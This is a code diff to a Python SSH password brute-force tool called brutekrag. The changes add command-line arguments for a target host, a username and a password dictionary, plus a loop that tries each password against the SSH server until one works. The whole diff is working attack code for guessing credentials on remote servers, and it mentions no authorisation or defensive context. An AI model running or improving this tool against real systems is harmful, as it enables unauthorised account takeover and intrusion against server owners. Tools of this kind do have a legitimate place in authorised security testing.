@@ -37,7 +37,7 @@ banner = ('''\033[92m      _                _       _
 
 
 class brutekrag:
-    def __init__(self, host, port):
+    def __init__(self, host, port=22):
         self.host = host
         self.port = port
         self.list_users = []
@@ -56,8 +56,8 @@ class brutekrag:
                 password=password
             )
 
-        except paramiko.AuthenticationException, e1:
-            print '%s password failed' % password
+        except paramiko.AuthenticationException:
+            print '%s password for user %s failed' % (password, username)
             client.close()
             return -1
 
@@ -69,15 +69,26 @@ class brutekrag:
 
 
 if __name__ == '__main__':
-    if len(sys.argv) < 4:
-        print banner, 'args missing'
-        sys.exit(1)
+    import argparse
+    from argparse import RawTextHelpFormatter
 
-    hostname = sys.argv[1]
-    password = sys.argv[2]
+    parser = argparse.ArgumentParser(description=banner,
+                                     formatter_class=RawTextHelpFormatter)
 
-    username = 'admin'
-    port = 22
+    parser.add_argument('hostname', type=str, help='Target hostname or IPv4')
+    parser.add_argument('username', type=str, help='Target username')
+    parser.add_argument('dictionary', type=str, help='Path to password dictionary file. One password per line.')
+    parser.add_argument('-p', '--port', type=int, help='Target port (default 22)', default=22)
 
-    b = brutekrag(hostname, port)
-    b.connect(username, password)
+    try:
+        args = parser.parse_args()
+    except TypeError:
+        parser.print_help()
+        parser.exit()
+
+    btkg = brutekrag(args.hostname, args.port)
+    with open(args.dictionary, 'r') as dictionary:
+        for password in dictionary:
+            if btkg.connect(args.username, password.strip()) == 0:
+                break
+        dictionary.close()
